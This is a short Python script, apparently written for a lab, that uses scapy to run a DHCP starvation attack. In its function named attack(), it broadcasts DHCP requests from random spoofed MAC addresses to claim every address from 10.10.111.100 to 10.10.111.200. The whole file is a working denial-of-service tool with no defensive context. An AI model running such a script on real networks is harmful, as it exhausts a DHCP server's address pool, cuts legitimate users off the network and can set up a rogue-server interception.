from scapy.all import *
import os
import sys
import time

def attack():

    ip_pool = []

    #puts pool into a list
    for i in range(100, 201):
        req = "10.10.111." + str(i)
        ip_pool.append(req)

    #requests each ip
    for ip in ip_pool:
        currMac = RandMAC()

        dhcp_request = Ether(src = currMac, dst = "ff:ff:ff:ff:ff:ff")
        dhcp_request /= IP(src = "0.0.0.0", dst = "255.255.255.255")
        dhcp_request /= UDP(sport = 68, dport = 67)
        dhcp_request /= BOOTP(chaddr = currMac)
        dhcp_request /= DHCP(options = [("message-type", "request"), ("requested_addr", ip), "end"])

        #sends packet
        sendp(dhcp_request)
        time.sleep(0.2)

def main():
    attack()

if __name__ == "__main__":
    main()
    